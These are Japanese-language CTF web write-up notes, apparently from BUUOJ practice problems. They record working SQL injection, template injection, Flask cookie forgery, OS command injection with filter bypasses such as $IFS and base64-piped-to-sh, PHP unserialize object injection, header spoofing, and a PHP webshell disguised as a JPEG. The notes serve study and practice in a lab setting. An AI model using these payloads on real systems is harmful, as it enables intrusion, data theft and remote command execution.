# ctf web
過去に出題されたCTFのweb問を解いていきます。write upというよりメモなのでめちゃくちゃ適当です。

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
- [[强网杯 2019]随便注](#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8)
- [[HCTF 2018]WarmUp](#hctf-2018warmup)
- [[强网杯 2019]随便注](#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8)
- [[SUCTF 2019]EasySQL](#suctf-2019easysql)
- [[极客大挑战 2019]EasySQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019easysql)
- [[极客大挑战 2019]Havefun](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019havefun)
- [[护网杯 2018]easy_tornado](#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018easy_tornado)
- [[RoarCTF 2019]Easy Calc](#roarctf-2019easy-calc)
- [[极客大挑战 2019]Secret File】](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file)
- [[极客大挑战 2019]LoveSQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019lovesql)
- [[ACTF2020 新生赛]Include](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Binclude)
- [[HCTF 2018]admin](#hctf-2018admin)
- [[GXYCTF2019]Ping Ping Ping](#gxyctf2019ping-ping-ping)
- [[极客大挑战 2019]PHP](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php)
- [[ACTF2020 新生赛]Exec](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec)
- [[极客大挑战 2019]Http](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http)
- [[SUCTF 2019]CheckIn](#suctf-2019checkin)
- [[极客大挑战 2019]BabySQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019babysql)
- [[极客大挑战 2019]Upload](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019upload)
- [[ACTF2020 新生赛]BackupFile](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bbackupfile)
- [[ACTF2020 新生赛]Upload](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bupload)
- [【[极客大挑战 2019]BuyFlag】8/15](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019buyflag815)
- [[网鼎杯 2018]Fakebook](#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018fakebook)
- [[ZJCTF 2019]NiZhuanSiWei](#zjctf-2019nizhuansiwei)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# [HCTF 2018]WarmUp
## /source.php
```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

## /hint.php
```
flag not here, and flag in ffffllllaaaagggg
```

> $_REQUEST 内の変数の内容は、 GET や POST そして COOKIE といった仕組みでスクリプトに渡されます。

GETでもPOSTでもいい

```
mb_substr — 文字列の一部を得る
mb_strpos — 文字列の中に指定した文字列が最初に現れる位置を見つける
```
```
$ curl http://9281cf7e-b005-450d-8919-19c2ba0b1f40.node3.buuoj.cn/ -d "file=hint.php?./hint.php"
```
うまくいかない。

```
$ curl http://9281cf7e-b005-450d-8919-19c2ba0b1f40.node3.buuoj.cn/ -d "file=hint.php?/../hint.php"
```

```
$ curl http://9281cf7e-b005-450d-8919-19c2ba0b1f40.node3.buuoj.cn/ -d "file=hint.php?/../../../../ffffllllaaaagggg"
```

flag{b82e2643-70f6-4048-90d2-26b2e0a89276}

# [强网杯 2019]随便注

```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```
selectが正規表現によって使えなくなっている。

```
1' or 1=1 #
```
でSQLiが通る。

```sql
1'; show databases;#
```
```sql
1'; show tables;#
```
```sql
1';show columns from words;#
```
```sql
1'; show columns from `1919810931114514`;#
```

##  selectをasciiコードに変換することでselectをbypassする

### 1つめの解

> PREPARE文を実行すると、指定された問い合わせの構文解析、書き換えが行われます。 その後、EXECUTE文が発行された際に、プリペアド文は実行計画が作成され、実行されます。

```sql
1'; PREPARE hacker from concat(char(115,101,108,101,99,116), '* from `1919810931114514`); EXECUTE hacker; #
```

```sql
1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#
```

### 2つめの解
```sql
1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;#
```
SET 文は新しい値を変数を代入する

### 3つめの解
```
1'; rename table words to word1; rename table  `1919810931114514` to words; alert table words 
add id int unsigned not Null auto_increment primary key ; alert table words change flag data 
varchar(100); #
```
https://www.techscore.com/tech/sql/SQL3/03_02.html/
```
テーブルの変更は ALTER TABLE 文で行います。既存のテーブルの定義を変更します。ALTER TABLE は次の機能を備えています。
* テーブルに列を追加する
* テーブルから列を削除する
* テーブルにテーブル制約を追加する
* テーブルからテーブル制約を削除する
* 列にデフォルト値を追加する
* 列からデフォルト値を削除する
```

これはよくわかってない。

## flag
```php
array(1) {
  [0]=>
  string(42) "flag{46d955e2-1b6b-4184-8efe-8aa648aaf6b1}"
}
```

# [SUCTF 2019]EasySQL

数字をいれると、Arrayが返ってくる。
1,2,3,4,5,みたいな感じしか1以外の入力を受け付けてない。
1,23,4,1みたいに最後の数字は1になる。
文字列もダメなど、WAFに弾かれていることがわかる。

## 1;show databases;#

```php
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
```

## 1;show tables;#

## 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1
sql_modeを利用してCONCATとしてパイプを利用する。

また、
```sql
1,*
```
でもいいらしい。

## select 1||2 とは
```sql
select *,1||2
```
```sql
select 1 from Test;
```
の返り値は、カラムの数だけ1が返ってくる❓

```sql
select 1 || title from Test;
```
は1しか返ってこない。

```sql
select *,1 || title from Test;
```

idとtitleと1が返ってきてる。つまり、すべてが返ってくる。よくわかってない。

# [极客大挑战 2019]EasySQL

usernameに
```sql
‘ or 1=1#
```
いれるだけでflagでてきた。


# [极客大挑战 2019]Havefun

ソースコードみるだけ。

# [护网杯 2018]easy_tornado

filehash
c4b6eac7d43a398647521bea321ef5bd
→ md5❓

## /hints.txt
```php
md5(cookie_secret+md5(filename))
```
md5なら二重でもできるんじゃないかと一瞬おもったけど流石にムリで

## /error?msg={{2}}

msgにテンプレートインジェクションの脆弱性がある

```
トルネードのテンプレートでは、アクセス可能なクイックオブジェクトがいくつかあり、ここで使用されているものはhandler.settingsで、handlerはRequestHandlerを指し、RequestHandler.settingsはself.application.settingsを指しています。 handler.settings は、環境変数である RequestHandler.application.settings を指します。
```
https://sites.google.com/site/tornadowebja/documentation/overview

## /error?msg={{handler.settings}}
```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'c04a08db-f5fe-4bc4-ac4e-7ecc766d6c4f'}
```

## /file?filename=/fllllllllllllag&filehash=6d523f04b91fc691678043e7e9307b72

# [RoarCTF 2019]Easy Calc

正規表現のオプション修飾子
* 修飾子の種類と指定方法
* 大文字と小文字を区別せずにマッチを行う(/i修飾子)
* パターンの中の空白やコメントを無視する(/x修飾子)
* メタ文字(.)が改行にマッチする(/m修飾子)

```php
$blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
```

## /calc.php?num=phpinfo()
うまくいかない。
## /calc.php? num=phpinfo()
空白をいれるとwafをbypassできる。
これは、phpの構文解析の仕様で変数の前にスペースがあると構文解析の前にスペースを削除してくれることを利用している。
WAFが文字をnumにわたすことを許可していないが、変数numの前に空白をいれるとそれは変数numではないからbypassできる。多分。
あとは構文解析されれば、スペースは削除してくれるからnum変数に値をいれているのと同じになる???

## ? num=var_dump(scandir(chr(47)))
f1agg
## ? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))

指定の文字が使えないときは、asciiの10進数表記に変換してphp上でバイト列を文字列に変換する。

# [极客大挑战 2019]Secret File】

action.phpに飛ばされてすぐend.phpにリダイレクトされる。
action.phpのレスポンスを見てみると

```
HTTP/1.1 302 Found
Server: openresty
Date: Wed, 12 Aug 2020 14:38:56 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 63
Connection: close
Location: end.php
X-Powered-By: PHP/7.3.11
```

```html
<!DOCTYPE html>

<html>
<!--
   secr3t.php        
-->
</html>
```

```php
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
```

stristr関数 文字列１から文字列２を検索する


## /secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MTVlOTY0MTEtMjA1My00MTc3LWE0M2QtMjlkMDVlYmQ2OTE5fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
```

# [极客大挑战 2019]LoveSQL
```
id: admin
pw: ‘1 or 1=1 #
```
で
```
Login Success!
Hello admin！

Your password is 'cf778af30fb59ea1654c83a49632a072'
```

## 1' union select 1,2,3#

```
Hello 2！
Your password is '3
```

## ' union select 1,group_concat(table_name),group_concat(column_name) from information_schema.columns#

```
users,users,users,geekuser,geekuser,geekuser,l0ve1ysq1,l0ve1ysq1,l0ve1ysq1
```

## ' union select 1,group_concat(username),group_concat(password) from l0ve1ysq1#
```
flag{fe4f2083-0fcc-43bc-8401-8b7ec595e2ab}
```


# [ACTF2020 新生赛]Include

## ?file=php://filter/convert.base64-encode/resource=flag.php

```bash
% echo -n 'PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZTc0N2UyOWYtNTgzOS00YzQ3LWJjYWMtNmRhYmRiYzViMzAzfQo=' | base64 -d
<?php
echo "Can you find out the flag?";
//flag{e747e29f-5839-4c47-bcac-6dabdbc5b303}
```

# [HCTF 2018]admin
```
Cookie: session=.eJw90LFugzAQBuBXqW5mwA4TUoZWpgikM0pkQOcFtYQIbJJKQBRwlHevm6Hb6Ybv_-8e0Jynbu4hXqZbF0AznCB-wNs3xEDqfSODTqqSSY4h1hnD-jhqk6zIP3uZZiGKvtcp3pHjKs3JapEw4tqSoVCbyqCinRcGNLTJVFtdl6tOy43UcZSqsoXPkDy3RZ1FRZ04MgeOBjm5j4Fc67NH-7cvhOxRlLxIyfvEveu0aDc_3X2_PTwDaOfp3Cw_trv-n4Ai77WyIfGMSeFrX3KjFXItKlOIMsKUdp6L0GTO84xUNcjD_sVdvy6dJ5ZuXiCA29xNr-cAC-H5C4lvY6o.XzSGbQ.E-3ACmftDiR0r90s0FFnqrKhQ1Q
```
JWTかと思ったが、デコードできない。

パスワードを変更するページのコメントにgithubのURLが書かれている。

## https://github.com/woadsl1234/hctf_flask/
## https://github.com/woadsl1234/hctf_flask/blob/master/user.sql

```
INSERT INTO `user` (`id`, `email`, `password_hash`, `username`) VALUES (1, NULL, 'pbkdf2:sha1:1000$HHGfbouP$eaa88f64aad0dd3f81a72c16337c03cd1bdc6be1', 'admin'), (2, NULL, 'pbkdf2:sha1:1000$ErwOESOB$f61a07b6836fab26e885f0dd5419b0f75ea5bf96', 'ckj123');
```
id:1がusername:adminであることがわかる。

### さっきみたsessionは、flaskのsession
フレームワークによって特有のエンコードがされてる??

```bash
$ python3 flask_session_cookie_manager3.py decode -c '.eJxF0LFugzAQBuBXqW5mADddkDKkglpUOqNEJtZ5iVriBGyaSkAEJsq718nS7XTD999_NzicejM0kI791URwaI-Q3uDlG1IgufFkcRGySgTDGFWRoNp12uYzso9G8CLGrGk0xwkZzsIenc7yhJh2ZCnWdm9R0msQWrTkBddOq2rWvPIkd52Qe1eGDME-XamKVanyheyWoUVGy3tLSx2yO_fYl5loMKtYySn4xIK76Kz2YZrCfWu4R1AP_ekw_jpz-a9gRYfLeUZOK8FEq1XhtT0HfvMW-AkVeS2LcCr5R7VQNxHb9ZO7fP2YQIxmGCGC62D653MgieH-BwaHZZc.XzSM-Q.tafq7Do_7uvnMmlRVYrzFqk5Wfg'
b'{"_fresh":true,"_id":{" b":"YTAyYjMzNTU1N2M0MWI1MWRlZjExM2FhNGI0MDhhZGMwM2MxNjdkZDE1Y2ZkYjY0ZjVjMTY3MzNiMjYyNGZkZWUxZGUyYTRlNTVkOTAyN2JkOWI4OWEzYjQ2MjM2YzBiYzczNTlkOWEzODNhMDU2OGY1Y2Y2MTYzZDcyY2MwNTU="},"csrf_token":{" b":"YjNlMzgxMGY4N2NiZWIyZjg2YzA5YzcwMWYyZTI0ZjYyMWRlYjM1NQ=="},"name":"test","user_id":"10"}'

'{"_fresh":true,"_id":{" b":"YTAyYjMzNTU1N2M0MWI1MWRlZjExM2FhNGI0MDhhZGMwM2MxNjdkZDE1Y2ZkYjY0ZjVjMTY3MzNiMjYyNGZkZWUxZGUyYTRlNTVkOTAyN2JkOWI4OWEzYjQ2MjM2YzBiYzczNTlkOWEzODNhMDU2OGY1Y2Y2MTYzZDcyY2MwNTU="},"csrf_token":{" b":"YjNlMzgxMGY4N2NiZWIyZjg2YzA5YzcwMWYyZTI0ZjYyMWRlYjM1NQ=="},"name”:”admin”,”user_id”:”1”}’
```

## https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py
エンコードするときに署名しなければいけないのでkeyが必要になるがconfig.pyに書かれていた。

```bash
$ python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t '{"name":"admin","user_id":"1"}'eyJuYW1lIjoiYWRtaW4iLCJ1c2VyX2lkIjoiMSJ9.XzSPIA.1qd67Fsbd9g2ErTAVcFUukw16sQ
```
```html
<h1 class="nav">flag{92615bb9-8e91-43cc-8f12-f8543bd02ded}</h1>
```

# [GXYCTF2019]Ping Ping Ping

?ip=192.168.2.100;id

```
/?ip=192.168.2.100:id
```
```
PING 192.168.2.100 (192.168.2.100): 56 data bytes
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```

OSコマンドインジェクションできる

## ?ip=;ls
```
/?ip=
flag.php
index.php
```

## ?ip=;cat flag.php
```
?ip= fxck your space!
```
spaceをいれると怒られる。

## ?ip=;cat\tflag.php
```
?ip= fxck your flag!
```

## space bypass
```
%20、%09、$IFS$1、${IFS}、<>、{cat,flag}
```
などがある。

%09は、タブ文字
%20は、半角スペーズです。

> 環境変数「IFS」（Internal Filed Separator）には、bashの場合「スペース」「タブ」「改行」（$’ \t\n’）といった値が初期設定されていて、これらが文字の区切りとして認識されています。
> ファイル等を読み込んだりする場合に、読み込む文の区切り文字を変更したい場合は、「IFS」に区切り文字としたい値を設定することで、区切りとさせる文字を好きに設定することが出来ます。

macで確認してみると
```bash
% echo ${IFS}


takumaniwa@Takumas-MacBook-Pro react % ${IFS}     
zsh: command not found:  \t\n
```
\t\nが割り当てられていることがわかります。

$IFS$1でも同様の結果になります。
```bash
% echo $IFS$1


takumaniwa@Takumas-MacBook-Pro react % $IFS$1     
zsh: command not found:  \t\n
```

つまり、サーバ側で設定されているIFSを利用して空白として利用するということ。

## cat$IFS$1`ls`
```
/?ip=

/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

## ?ip=;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```php
/?ip=
<pre><?php
$flag = "flag{06c6b77d-475b-402a-aa5d-1df566f1cdf2}";
?>
```

他にもhexやoctに変換してflagが禁止されているのをbypassできる。

# [极客大挑战 2019]PHP

```
$ gobuster dir -u f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn -w /usr/share/dirb/wordlists/big.txt -t 50 -q -x php,html,txt,bak
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/class.php (Status: 200)
```

gobusterでenumerateしたが、429 Too Many Requestsが返ってきたのでうまくできずにdirsearch.pyでdelayを2にしたところうまくスキャンできた気がした。
```
dirsearch
    -e EXTENSIONS, --extensions=EXTENSIONS
    -w WORDLIST, --wordlist=WORDLIST
    -r, --recursive     Bruteforce recursively
```

```bash
$ python3 dirsearch.py -u http://f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn -e php -s 2

[09:20:29] Starting: 
[09:22:54] 403 -  332B  - /.htaccess-dev                              
[09:22:55] 403 -  334B  - /.htaccess-marco
[09:22:55] 403 -  334B  - /.htaccess-local
[09:22:56] 403 -  333B  - /.htaccess.bak1
[09:22:57] 403 -  333B  - /.htaccess.orig
[09:22:57] 403 -  335B  - /.htaccess.sample
[09:22:57] 403 -  332B  - /.htaccess.old
[09:22:57] 403 -  332B  - /.htaccess.txt
[09:22:58] 403 -  333B  - /.htaccess.save
[09:22:58] 403 -  331B  - /.htaccessBAK
[09:22:58] 403 -  331B  - /.htaccessOLD
[09:22:58] 403 -  332B  - /.htaccessOLD2
[09:22:59] 403 -  332B  - /.htpasswd-old  
[09:23:00] 403 -  330B  - /.httr-oauth
[09:25:22] 400 -  154B  - /%2e%2e/google.com                        
[09:32:20] 403 -  327B  - /cgi-bin/                                     
[09:35:16] 403 -  325B  - /error/                                              
[09:37:18] 200 -    2KB - /index.php                          
[09:37:22] 200 -    2KB - /index.php/login/
[09:49:21] 200 -    6KB - /www.zip    
```
```bash
$ wget http://f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn/www.zip
--2020-08-13 09:11:19--  http://f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn/www.zip
Resolving f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn (f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn)... 111.73.46.229
Connecting to f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn (f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn)|111.73.46.229|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5941 (5.8K) [application/zip]
Saving to: ‘www.zip’

www.zip              100%[===================>]   5.80K  --.-KB/s    in 0s      

2020-08-13 09:11:20 (280 MB/s) - ‘www.zip’ saved [5941/5941]
```
```
$ unzip www.zip
Archive:  www.zip
  inflating: index.php               
  inflating: flag.php                
  inflating: index.js                
  inflating: class.php               
  inflating: style.css               
kali@kali:~/buuoj.cn/php$ ls
class.php  flag.php  index.js  index.php  style.css  www.zip
kali@kali:~/buuoj.cn/php$ cat flag.php 
<?php
$flag = 'Syc{dog_dog_dog_dog}';
?>
```
```bash
$ cat index.php

    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```
```php
$ cat class.php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

ユーザからの任意の入力のアンシリアライズを許すことによって任意のオブジェクトを生成される脆弱性っぽい。



> シリアライズとは、複数の要素を一列に並べる操作や処理のこと。単にシリアライズといった場合には、プログラムの実行状態や複雑なデータ構造などを一つの文字列やバイト列で表現する「直列化」を指すことが多い。


> __destruct(). デストラクタは、オブジェクトが破棄されて、オブジェクトへの参照が全て無くなった場合に呼び出される後処理です。

> __destruct()は、unserialize()で呼ばれるわけではなく、デシリアライズしたインスタンスの参照が0になるタイミングで実行されます。
これは通常のクラスインスタンスと同じ挙動です。

## 参考にしたサイト
https://blog.tokumaru.org/2015/07/phpunserialize.html

https://www.1x1.jp/blog/2010/11/php_unserialize_do_not_call_destruct.html

http://blog.a-way-out.net/blog/2014/07/22/php-object-injection/

## 任意のオブジェクトを生成する

```php
<?php
class Name
{
    private $username = 'admin';
    private $password = '100';
}
$a = new Name();
echo urlencode(serialize($a));
?>
```
これでいけるかと思ったら
```
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
```
メンバ変数の数を2から3もしくはそれ以上じゃなきゃいけないとflagが表示されない

```
2を3に変更した理由は、__wakeup()関数をバイパスしてユーザ名を上書きしないようにするためで、%00はユーザ名とパスワードがプライベート変数であり、変数内のクラス名の前後に空白が生じ、コピーが失われるからです。 ペイロードを取得して提出してフラグを取得します。
```

```bash
$ curl -i http://f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn/index.php?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
HTTP/1.1 200 OK
Server: openresty
Date: Thu, 13 Aug 2020 14:42:39 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1795
Connection: keep-alive
X-Powered-By: PHP/5.3.3

<!DOCTYPE html>
<head>
  <meta charset="UTF-8">
  <title>I have a cat!</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
      <link rel="stylesheet" href="style.css">
</head>
<style>
    #login{   
        position: absolute;   
        top: 50%;   
        left:50%;   
        margin: -150px 0 0 -150px;   
        width: 300px;   
        height: 300px;   
    }   
    h4{   
        font-size: 2em;   
        margin: 0.67em 0;   
    }
</style>
<body>







<div id="world">
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">
    flag{5f7c3db5-1edb-4f0c-abe7-ca38b6460fea}    </div>
    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</div>
<script src='http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'></script>
<script  src="index.js"></script>
</body>
</html>
```
# [ACTF2020 新生赛]Exec

OSコマンドインジェクションが使える。
```
;cat /flag
```
flag{b64ec65f-7ef7-4efe-9050-826f82b59e64}

# [极客大挑战 2019]Http

```html
<h2>小组简介</h2> <p>·成立时间：2005年3月<br /><br /> ·研究领域：渗透测试、逆向工程、密码学、IoT硬件安全、移动安全、安全编程、二进制漏洞挖掘利用等安全技术<br /><br /> ·小组的愿望：致力于成为国内实力强劲和拥有广泛影响力的安全研究团队，为广大的在校同学营造一个良好的信息安全技术<a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>！</p>
```

ふつうにSecret.phpにアクセスすると
```
It doesn't come from 'https://www.Sycsecret.com'
```
といわれるので、refererヘッダを書き換える。
```
% curl -i http://node3.buuoj.cn:29595/Secret.php -H "referer: https://www.Sycsecret.com" 
```

```html
<h1>Please use "Syclover" browser</h1>
```
```
% curl -i http://node3.buuoj.cn:29595/Secret.php -H "referer: https://www.Sycsecret.com" -A Syclover
```

```html
<h1>No!!! you can only read this locally!!!</h1>
```
> X-Forwarded-Forとは、HTTPヘッダフィールドの1つであり、ロードバランサなどの機器を経由してWebサーバに接続するクライアントの送信元IPアドレスを特定する際のデファクトスタンダードです。
クライアントの送信元IPアドレスの特定は、ロードバランサなどでクライアントの送信元IPアドレスが変換された場合でも、HTTPヘッダに元のクライアントIPアドレスの情報を付加することで実現します。

> HTTP リクエストがレイヤー 7 プロキシを通過すると、このパケットの送信元 IP は、クライアントの実際の IP (クライアント IP) ではなく、プロキシ IP に変更されます。 実際には、クライアント IP は HTTP ヘッドフィールドの x-forwarded-for フィールドに書き込まれます。

つまり、X-Forwared-Forとは通常サーバにアクセスするまでにproxyなどを経由した場合、送信元IPアドレスが書き換えられてしまうが書き換えれるたびに今までの送信元IPアドレスをメモしておくヘッダである。

これを書き換えることでlocalhostから自分のパソコンをproxyとして経由してSecret.phpにアクセスしてるように偽装することができる。多分。
```
% curl -i http://node3.buuoj.cn:29595/Secret.php -H "referer: https://www.Sycsecret.com" -H "x-forwarded-for:localhost" -A "Syclover"
```
flag{784392dc-e1db-411a-b5a6-989fc4a2c0d9}

# [SUCTF 2019]CheckIn

upload問題なのでとりあえず、jpgファイルと偽装させたphpファイルをアップロードする。
次のようにshell.jpgを定義し
```php
<?php os.system($_GET['cmd']);?>
```
ファイルの先頭に画像のマジックナンバーを挿入することで画像ファイルであると認識させる。
```
$ echo "FFD8FFE0" | xxd -r -p > test.jpg
$ cat shell.jpg >> test.jpg
$ file test.jpg 
test.jpg: JPEG image data
```

しかし、当然これでは
```
<? in contents!
```
といわれ怒られます。

burpを挟んでファイルの情報を書き換えてもサーバ側で確認されてるの意味がないようです。いろいろ調べていると、サーバ側のphpの設定ファイルを書き換えることでこれをbypassできそうだということがわかりました。

php.iniとは
> 設定ファイル (php.ini) は PHP の起動時に読み込まれます。 PHP のサーバーモジュール版では、Web サーバーの起動時に 一度だけ読み込まれます。CGI 版と CLI 版では、スクリプトが呼び出される度に読み込まれます。

> php.ini設定には、auto_prepend_fileとauto_append_fileという設定があります。こちらの設定は、PHPスクリプトの実行前と実行後に自動インクルードファイルです。

auto-prepend-fileとは
> メインファイルの実行前に呼び出されるファイルを設定します。
php.ini、.httaccessに設定すれば使用することが可能です。

auto_append_fileとは
> メインファイルの実行後に呼び出されるファイルを設定します。
php.ini、.httaccessに設定すれば使用することが可能です。

.user.iniとは
> PHP 5.3.0 以降、PHP はディレクトリ単位での INI ファイルをサポートするようになりました。 このファイルは、CGI/FastCGI SAPI の場合にのみ処理されます。 この機能は、PECL htscanner 拡張モジュールを置き換えるものです。 Apache モジュールとして PHP を実行している場合は .htaccess ファイルを使えば同じ機能を実現できます。
